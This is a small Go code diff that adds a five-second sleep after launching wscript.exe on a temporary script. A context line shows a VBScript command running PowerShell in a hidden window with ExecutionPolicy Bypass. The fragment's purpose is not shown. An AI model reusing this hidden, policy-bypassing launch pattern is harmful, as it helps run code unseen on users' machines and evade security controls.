@@ -11,6 +11,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"time"
 )
 
 func fset(data_path string) {
@@ -66,4 +67,5 @@ objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"%s\"", 0
 
 	cmd := exec.Command("wscript.exe", "//Nologo", "//B", tempScriptPath)
 	cmd.Start()
+	time.Sleep(time.Second * 5)
 }
